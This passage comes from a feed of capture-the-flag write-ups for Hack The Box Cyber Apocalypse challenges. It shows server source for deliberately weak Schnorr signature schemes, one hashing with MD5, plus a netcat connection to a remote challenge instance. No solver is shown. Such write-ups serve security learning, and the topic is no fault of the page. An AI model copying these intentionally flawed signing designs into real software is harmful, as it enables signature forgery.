class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ev&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ev&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'[S]ign a message'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'[V]erify a signature'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'&amp;gt; '&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">upper&lt;/span>&lt;span class="mtk1">()[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">sha256chnorr&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">SHA256chnorr&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'g:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">sha256chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'y:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">sha256chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">y&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'p:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">sha256chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">_&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'S'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">fromhex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter message&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'right hand'&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'No!'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">sig&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">sha256chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">sign&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Signature:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">sig&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'V'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">fromhex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter message&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter s&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter e&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">sha256chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">verify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1">, (&lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">)):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'right hand'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Valid signature!'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Invalid signature!'&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Invalid choice...'&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">signal&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">alarm&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">30&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="schnorr-signature">Schnorr signature&lt;/h2>
&lt;p>The challenge implements a signing server using &lt;a target="_blank" href="https://en.wikipedia.org/wiki/Schnorr_signature">Schnorr signature&lt;/a>. The algorithm to sign a message $m$ is the following:&lt;/p></description></item><item><title>Calibrator</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/calibrator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/calibrator/</guid><description>&lt;p>We are given a remote instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 165.227.224.40 31139

[&lt;span class="code-dark-green">OK&lt;/span>] Memory check
[&lt;span class="code-dark-green">OK&lt;/span>] Syncing filesystem
[&lt;span class="code-dark-green">OK&lt;/span>] Detecting sensors
[&lt;span class="code-dark-green">OK&lt;/span>] Module loader
[&lt;span class="code-dark-green">OK&lt;/span>] Reading configurations

Inititing calibration process ...


┌──────────────────────────────────────────────────────────────────────┐
│┼───────────────────┼────────────────────────┼┼──────────────────────┼│
││ XenoCal 2000 │ . ││ ││
│┼───────────────────┤ ┌─┐ x││ . . ││
││ Iteration: 42 │ x ► └─┘ ││ x ││
│┼─────────┬─────────┤ ││ ││
││ X:1337 │ Y:65189 │ . x ┌───┼┼───┐ ││
│┼─────────┴─────────┘ x ┌─┘ ││ └─┐ x ││
││ . ┌─┘ ││ └─┐ ││
││ ┌─┐ x ▼ ┌┘ . ││ └┐ x ││
││ └─┘ . ┌┘ ││ └┐ ││
││ . │ ││ . │ ││
│┼──────────────────────────────────┼─────────┼┼─────────┼────────────┼│
││ x │ x ││ │ ▼ ││
││ x ──►x └┐ ││ ┌┘ ││
││ . ▼ └┐ ││ ┌┘ . ││
││ . └─┐ ││ ┌─┘ ││
││ ┌─┐ x └─┐ ││ ┌─┘ x ││
││ └─┘ ┌─┐ ┌─┐ └───┼┼───┘ ││
││ └─┘ └─┘ ││ ││
││ x . . ││ . ││
││ . x ││ x ││
││ x ▼ x . ││ x ││
││ ││ ││
│┼────────────────────────────────────────────┼┼──────────────────────┼│
└──────────────────────────────────────────────────────────────────────┘ ┌─ 
 │
 ┌─┬───────────────────────────┬─┐ ┌──────┐ ┌───┼┐
 │ │┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼│ │ │[=()=]│ ├────┤
 │ │┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼│ │ ┌──┼──────┼──┐ │ │
 │ │┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼│ │ │◄├┼┼┼┼┼┼┼┼┤►│ │ │
 │ │┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼│ │ └──┼──────┼──┘ ├────┤
 └─┴───────────────────────────┴─┘ │[=()=]│ └────┘
 └──────┘

Iteration 0:
&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>And we also have the source code in Python:&lt;/p></description></item><item><title>Colliding Heritage</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/colliding-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/colliding-heritage/</guid><description>&lt;p>We are provided with the server source code in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk3">#!/usr/bin/env python3&lt;/span>

&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">signal&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">secrets&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">randbelow&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">hashlib&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">md5&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">isPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span> 

&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"HTB{???????????????????????????}"&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">MD5chnorr&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># while True:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># self.q = getPrime(128)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># self.p = 2*self.q + 1&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># if isPrime(self.p):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3"># break&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">0x&lt;/span>&lt;span class="mtk6">16dd987483c08aefa88f28147702e51eb&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">2&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">randbelow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">y&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">md5&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">digest&lt;/span>&lt;span class="mtk1">()) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sign&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">k&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">k&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">k&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">x&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">verify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">sig&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">sig&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">not&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">not&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">False&lt;/span>
